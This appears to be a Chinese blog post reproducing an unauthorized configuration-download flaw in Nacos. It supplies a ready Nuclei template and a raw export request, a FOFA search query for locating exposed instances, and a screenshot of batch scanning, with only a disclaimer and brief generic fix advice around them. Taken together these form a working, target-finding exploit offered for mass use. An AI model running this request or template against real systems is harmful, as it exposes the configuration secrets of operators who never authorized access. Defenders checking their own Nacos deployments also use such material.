#  Nacos未授权下载配置信息【漏洞复现|附nuclei-POC】   
原创 kingkong  脚本小子   2024-11-26 03:51  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
****  
****  
**漏洞描述：**  
  
Nacos未授权下载配置信息。  
  
攻击者通过访问特定路径，非法获取配置文件等在内的敏感及关键信息，对系统安全构成重大威胁  
。  
  
  
01  
  
—  
  
**Nuclei POC**  
  
  
```
id: Nacos-unauthorized-Configuration_Information

info:
  name: Nacos未授权下载配置信息

  author: kingkong
  severity: high
  metadata:
    fofa-query: icon_hash="13942501"

http:
  - raw:
      - |
        GET /v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId= HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
              - 'status_code_1 == 200'
        condition: and

```  
  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：icon_hash="13942501"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187JYPP24Gf5gZEficzNlMVzELW7mibQEMtvupvqKpF3jq6AhskSOibz9ibhQ/640?wx_fmt=png&from=appmsg "")  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187hXZicibsclqpjTFjhswgy2RQhQKOm6HG79ia0zstQ7ZoDLX4UMD0VzX5g/640?wx_fmt=png&from=appmsg "")  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187puq5eTicDcgicnOKF8Cic65wH4Us8GN6JWC0XNicGLjD4fSQJuza4ibgd2A/640?wx_fmt=png&from=appmsg "")  
漏洞检测POC  
```
GET /v1/cs/configs?export=true&group&tenant&appName&ids&dataId HTTP/1.1
Host: 

```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneubibiaIicaogdDNqyve7j187lurjoH1AlaKZvrkz4akNbs38oKdvQ9X2Kk1uyQpIWwFZX2wtNuibU0w/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
—  
  
修复建议  
  
  
1、强化身份验证和访问控制：实施强密码策略、多因素身份验证，并根据用户角色和权限设置适当的访问控制。2、安全配置：确保系统和应用程序的安全配置，包括正确的文件和目录权限设置、网络访问控制等  
  
05  
  
—  
  
下载地址  
  
  
进入公众号点击POC可获取所有POC文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneS7aOPfDNKhvOicibVlyrkJ3A4EuUx5c5S8eAxFnF9KiaibAGJfP6ibB6ze4Rm4pZ7MI4jQibT05lTevqg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
